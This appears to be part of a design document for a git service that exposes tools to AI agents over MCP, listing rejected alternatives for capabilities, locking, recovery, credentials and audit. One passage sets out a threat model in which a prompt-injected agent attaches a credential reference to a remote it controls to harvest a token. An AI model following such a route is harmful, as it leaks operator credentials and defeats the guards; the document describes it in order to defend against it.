**The escape hatch is a capability, not a bypass.** Rejected: *the hatch sits outside the lattice*
— the literal reading of "full git is reachable", and it would give the deployment lock an
exception large enough to contain every operation the safety gate blocks. Also rejected: *a hard
floor the hatch cannot cross* — the most falsifiable guarantee, already considered and declined
in the brief, recorded here as known and retained rather than re-litigated. As a capability,
`git.raw` can be withheld at deploy, per declaration or per session, and where withheld the tool
is **not registered**, preserving registration-as-boundary for every session that lacks it.

**Clones are an evictable cache with a safety interlock.** Rejected: *retained until the operator
intervenes* — never surprises anyone, and it makes unbounded repository count a disk outage
waiting to happen, arriving as a write error mid-operation. Rejected: *a per-declaration size
cap* — bounds total size predictably, and evicts by an arbitrary rule rather than by what is safe
to lose. The interlock is the part that matters: a clone is evictable only when its tree is clean,
no branch is ahead of its upstream, no commits are unreachable from `origin/<base>`, no stash
exists and no journal entry is open. When nothing is safe to evict, the operation that needed
space is refused and names what is blocking it.

**Restart recovery is an intent journal.** Rejected: *infer state at boot from the repository
alone* — no new persistence, and it cannot distinguish "never started" from "half applied" for
any operation whose first step is idempotent, which is most of them. Rejected: *detect and report
only* — the prior art's behaviour, and what definition-of-done item 14 explicitly rules out. The
journal costs a write before every mutation and an abort if that write fails; accepted, because
an unrecoverable mutation is worse than a refused one.

**stdio processes proxy to the always-on instance.** Rejected: *each stdio process opens the
volume* — matches the prior art, and it is the second-instance case wearing a different hat;
either it defeats the instance lock or the lock defeats it. Rejected: *stdio gets its own volume*
— no contention, and two divergent sets of clones and grants for the same repositories is a
consistency problem with no upside.

**Bounded queue with a `conflict` timeout, rather than reject-on-contention.** Rejected: *reject
the second caller immediately* — a live option in the decision log, and better for agents, which
handle an explicit error more gracefully than a long block. Rejected because the console issues
short bursts of quick mutations where an immediate refusal is pure friction. The bounded queue is
both: short waits succeed, and a long wait becomes the explicit `conflict` an agent wanted.

**`gh` behind a host-adapter interface.** Rejected: *call GitHub's REST and GraphQL APIs
directly* — one less binary in the image, and the honest shape for a GitHub-only feature set.
Rejected for now because parity against captured fixtures is a definition-of-done item, and
swapping the host client during the parity migration adds risk with no stated benefit; the
interface keeps the swap additive. Rejected: *a host abstraction proven against a second
implementation* — the only thing that would make "no assumptions about host" fully true, and
materially the largest option, with no second host in evidence.

**Console extension via a versioned package consumed at the derived build.** Rejected: *the
prebuilt bundle discovers views at runtime* — no consumer build step, and it puts the UI outside
anything fingerprinted, which defeats the reason image-build extension was chosen. Rejected: *the
consumer forks the base console* — nothing to maintain across the seam, and every base
improvement becomes a merge.

**Declaration management is operator-only, structurally.** Rejected: *declaration tools exposed
over MCP* — the symmetric reading of "one canonical service per operation", and it hands an
injected agent a route to attach an existing credential reference to a remote it controls and
harvest the token from the push. The remote-host allowlist is the second, independent guard, so
the property does not rest on the capability alone. Also rejected: *presenting this as a
deployment default that could be flipped* — it cannot be, because a repository-bound session has
nothing to bind a declaration-creating call to, and the honest statement is that the session model
forbids it. Calling it a default invites someone to enable it later and either fail or punch a
non-repository resource URI through the model to make it work.

**One lock protocol, stated as four rules rather than one ordering.** Rejected: *the acquisition
order alone is the deadlock argument* — how this design read before review, and it is false: the
post-mutation disk-pressure check evicts under a materialisation lock taken after a mutation lock,
which is the reverse of the stated order. Also rejected: *releasing the materialisation lock after
the ensure step* — the intuitive reading of a lock that guards materialisation, and it opens a
window where eviction removes a clone between the ensure and the journal write, leaving an intent
record whose pre-state is no longer re-derivable. Also rejected: *making reads take the
materialisation lock so eviction cannot race them* — correct and unaffordable, since it
reintroduces the blocking the read exemption exists to remove; the exclusion lives on the eviction
side as a counter instead.

**Boot starts transports first and recovers lazily.** Rejected: *recover every declaration before
readiness* — the stronger guarantee, and it makes restart cost scale with estate size, so at a few
hundred clones the operator stops doing the restart that item 14 exists to make safe. A
declaration carrying unsettled entries is `recovery-pending`, serves reads, and refuses mutations
until it has recovered — which keeps the guarantee where it is load-bearing and drops it where it
was only tidy.

**A frozen session grant plus a declaration grant epoch.** Rejected: *recompute the grant on every
call* — simplest to describe, and it discards the prior-art rule that a token tier is fixed at
`initialize`, so a widened declaration grant would reach a live session. Also rejected: *freeze
and accept that revocation waits for the session to end* — what this design said before review,
and it leaves the operator restarting the container as their only revocation mechanism during an
incident. The epoch keeps the freeze's one-way property and still lets a narrowing land on the
next call.

**SQLite for structured state, JSONL for audit.** Rejected: *JSON files for everything* — no new
dependency, matching the prior art's `schedule.json`, and it cannot give the journal and the grant
store the atomic multi-row updates recovery classification needs. Rejected: *SQLite for audit too*
— one store to back up, and it makes the audit trail share a failure mode with the thing it audits.

**Host mutations journal a step before the call.** Rejected: *recovery probes the host* — the
strongest classification, since it asks the remote what actually happened; it makes boot recovery
depend on host reachability and a valid credential, and puts a rate-limit consumer on the restart
path. Rejected: *park every unsettled host-mutating entry unconditionally* — safest and simplest
to state, and it converts every ordinary interrupted push into operator toil.

**Hatch operands must match the declaration's own remote.** Rejected: *host-level allowlist only*
— what this design said before review, and unsound: an allowlist that must contain `github.com`
does not constrain which repository on it. Rejected: *no remote operands in the hatch at all* —
strongest and easiest to verify, and it narrows "full git is reachable" to exclude everything that
talks to a remote.

**Adoption of an orphaned clone is refused unless it is clean.** Rejected: *carry the previous
generation's unsettled entries forward* — preserves the record rather than refusing, and it
reopens the "re-declaring inherits nothing" property that `generation` exists to guarantee.
Rejected: *never adopt; always re-clone to a fresh path* — cleanest isolation, at the cost of a
full re-clone and an orphaned directory needing removal anyway.

**First credential provisioned from a file on the volume.** Rejected: *a one-time setup token
printed to the container logs* — the conventional shape, and it puts an unauthenticated setup
route on a publicly reachable origin until consumed. Rejected: *OIDC-only bootstrap* — no local
secret to place, and it makes the identity provider load-bearing at the one moment there is no
local fallback.

**Recovery descriptors registered into an L1 catalogue.** Rejected: *store the expected post-state
in the journal entry* — no catalogue and no registration, and resume steps still have nowhere to
live. Rejected: *hoist recovery into the composition root* — honest about what it needs, and it
widens the one path exempt from the dependency-direction check from a file into a subsystem.

**Each module prunes its own rows.** Rejected: *one retention module owning every window* — a
single place to read the policy, and it knows the schema of tables belonging to four other
modules. Rejected: *keep it in the clone store and declare the dependencies* — the smallest edit,
and it writes an L1→L4 edge into the layering the CI check exists to enforce.

**Write prefixes intersect declaration with actor profile.** Rejected: *a per-declaration deny
list, actor-independent* — one axis instead of two, and it cannot express "the operator may edit
the deploy workflow and the scheduler may not", which is the distinction the prior art drew.
Rejected: *one shared set, recording the inherited principle as dropped* — no new field, and it
hands unattended actors the operator's write surface.

**A single-writer queue inside the audit module.** Rejected: *drop the chain* — the design already
concedes it is defeated by service-privileged rewriting, so it buys detection only against
non-service tampering; rejected because that detection is still the strongest available claim.
Rejected: *a chain per stream* — avoids the race without a queue, and doubles the verification
surface while leaving inter-stream ordering unprovable.

**A parked clone admits the typed write tools to a repair session.** Rejected: *a console file
view for parked declarations* — directly addresses inspect-and-fix, and it is the content editor
the brief left open and the arbitrary-mutation route the non-goals push against. Rejected: *host
access is the documented exit* — no new surface, and definition-of-done item 13 requires every
terminal state to be reachable without supervision.

**Notification severity, with eviction summarised per pass.** Rejected: *drop the eviction
notification entirely* — smallest change and one severity retained, and the design's own argument
that outgrowing the disk is worth hearing about goes unserved. Rejected: *keep per-clone
notification and record the sizing as a premise* — honest, and it defers what the brief says is
not deferrable.

**The http adapter ships with published-URL verification as its consumer.** Rejected: *defer the
adapter entirely* — nothing unexercised inside the fingerprint, and it departs from the two-adapter
shape `MCP-NEXT.md` specifies. Rejected: *move deploy-status polling off `gh`* — exercises it
hardest, and it puts credentials at L3 during the parity migration.

**The watcher observes per-declaration content drops, generalising `blog-mcp`'s directory
watcher.** Rejected: *no watcher at all* — the smallest design, and it leaves headless file
delivery with no route that does not involve an MCP client. Rejected: *watch the managed clone
working trees* — it observes the service's own writes, needing a suppression rule that does not
generalise from one repository to many. Rejected: *watch a declaration drop directory for
onboarding* — GitOps-shaped and appealing, and declaration management is deliberately console-only
and structurally so. Rejected, and this one was briefly the design: *deliver to a local commit and
stop there, so the watcher needs no host capability or credential* — it looks like the
conservative choice and is the opposite. An unpushed commit is invisible to the producer, is the
one case the volume-loss table calls genuinely unrecoverable, and permanently fails the
safe-to-evict predicate, so every drop-enabled declaration would become a standing eviction
blocker. The prior art carries the sequence through to a pull request with auto-merge on by
default, and following it to a terminal state the producer can see is the whole point.

**Orphaned declarations stay operable to the operator.** Rejected: *a second `clone.remove`
override that discards unpushed work* — simplest, and it puts the one refusal the brief and the
prior art both treat as absolute behind a flag. Rejected: *a narrower adoption predicate than the
removal predicate*, so a clone ahead of upstream can be re-adopted — removes the trap for the
commit case and re-opens what the adoption refusal closed, since the adopting grant inherits
commits it never authorised. The trap existed because refusal and remedy shared one predicate:
work too valuable to evict was work too valuable to remove, with nothing able to reach it in
between.

**Capabilities are typed declaration-scoped or instance-scoped.** Rejected: *every declaration
grant implicitly contains the four operator capabilities* — one sentence and no new concept, and
it fills `capabilityGrant` with entries that mean nothing, weakening the framing `git.raw` depends
on. Rejected: *operator sessions skip layer 3 entirely* — neat and small, and it means a
declaration grant can never narrow the operator, `git.raw` included.

**`git.remote.write` is its own capability.** Rejected: *fold push into `git.local.write`* — one
fewer thing to get wrong, and it hands push to every profile that can commit, including the
unattended ones, collapsing the distinction `WATCHER_CAPABILITIES`'s separate `remote` flag draws
today. Rejected: *fold push into `host.pr.write`* — groups everything that reaches the network,
and leaves a `generic` declaration unable to push at all, contradicting "local git operations work
against any host".

**The notifier is at L1.** Rejected: *keep it at L2 and inject it into dispatch and recovery* —
consistent with the mechanism already used three times, and it gives the composition root a fourth
wiring job for a module with no domain knowledge to justify the placement. Rejected: *split
enqueue from delivery across two layers* — satisfies the same-transaction rule cleanly, and gives
"who notifies" two answers.

**Lifecycle is a checked module; the composition root wires only.** Rejected: *keep boot,
retention order and snapshot cadence in the root and widen the exemption* — zero restructuring,
and it makes the code most able to create illegal edges the code no check examines. Rejected:
*one composition root per concern* — each stays small, and three exempt paths is more surface
outside the check rather than less.

**Recovery resumes as an ordinary locked operation, ahead of its trigger.** Rejected: *forbid
resume steps from touching the host* — removes the boot-path question entirely, and weakens
recovery for composites, which span local and host steps by definition. Rejected: *hold the global
mutex across the whole recovery pass* — nothing to interleave, and it serialises recovery against
all other traffic, which is what lazy recovery exists to avoid.

**The provisioning file carries a secret; readiness passes.** Rejected: *out-of-band enrolment via
a CLI subcommand, no HTTP route at all* — the strongest reading of the no-unauthenticated-route
property, and it requires container exec while the design elsewhere treats the console as the only
operator surface. Rejected: *the file's presence is the authorisation* — nothing to manage, and it
is an open enrolment window on a public origin for as long as it lasts.

**Store retention ends in an incremental vacuum.** Rejected: *auto-vacuum at schema creation* —
set once and forgotten, at the cost of write amplification on every transaction forever, decided
before any data exists. Rejected: *accept that store retention frees no disk* — honest and
simplest, and it lets the fastest-growing table drive the volume to 95 % with no remedy but
evicting innocent clones.

**The journal entry carries the scheduled job id, not the reverse.** Rejected: *dispatch accepts a
caller-supplied `operationId`* — the most direct reading of the old text, and it is a
caller-controlled identity input on the canonical call path, which is what "no privileged route"
denies the scheduler. Rejected: *two-phase, where dispatch returns the id and the job records it
after* — no privileged input, and it reintroduces the crash window the write-before-dispatch rule
exists to close.

**The drop dispatches a declaration-named registry tool, not a file copy.** Rejected: *the
watcher copies dropped files to repository paths under the write allowlist* — the obvious reading
of "file delivery", and it makes the watcher the one actor that chooses repository paths, with the
allowlist as the only thing standing between a drop and any path it permits. Naming a tool
annotated as a drop target reuses `ScheduledJob.tool`'s existing constraint, keeps path policy
inside the domain operation where the prior art already puts it, and leaves the base shipping a
mechanism rather than a content policy.

**Claim-by-rename, with `processing/` as the crash marker.** Rejected: *a quiet period before a
file is considered ready* — what this design said before the prior art was read; it answers when a
file looks finished and never answers whose tick it belongs to, so a crash between commit and
clear re-runs the pipeline against a file that may already have an open pull request. Rejected:
*reprocess anything found in `processing/` at startup* — the intuitive recovery, and it is exactly
how one dropped file becomes two published ones.

**`RepositoryConfig` is read at point of use, never cached.** Rejected: *key the cache on the
config file's content hash* — keeps the cache and makes it correct, and the key computation is
itself the file read the cache was avoiding. Rejected: *keep the `HEAD` key and tighten the
invalidation rule* — smallest edit, and correctness then rests on every future handler
remembering, `git.raw` included.

**The index is digested, not written as a tree.** Rejected: *keep `write-tree` and refuse on an
unmerged index* — honest about the limit, and it leaves a conflicted declaration unable to run any
mutating tool. Rejected: *keep it as written* — no change, and pre-state capture stays a write
taken before the record that is supposed to precede the first one.

**The HTTP API accepts a cookie session or an operator API token.** Rejected: *cookie only, with
direct use scripting a login* — one mechanism, and scripting an enforced-TOTP login for routine
use is friction an operator routes around. Rejected: *direct programmatic use goes through MCP* —
one authenticated surface for scripts, and it demotes a surface the brief lists as first-class
with its own named consumer.

---

## Open questions

**None.** All seven questions this document opened are answered; each is a dated entry in
`90-decisions.md` with its rejected alternatives. The last of them — whether `git.raw` is
reachable from MCP sessions — is settled as reachable, with the declaration layer carrying the
default-deny; see The escape hatch's residual risk for what that places on a single field.

The fourth `/redteam` pass raised twenty-nine findings and the fifth raised twenty-one against the
fourth's repair; every one is resolved in the text above rather than deferred here. Two
resolutions add scope the earlier drafts did not carry — a content-drop watcher, generalised from
`blog-mcp`'s running one, and published-URL verification moving onto the http adapter — and both
need sizing when `/slices` runs, rather than being assumed free because they arrived as review
outcomes.
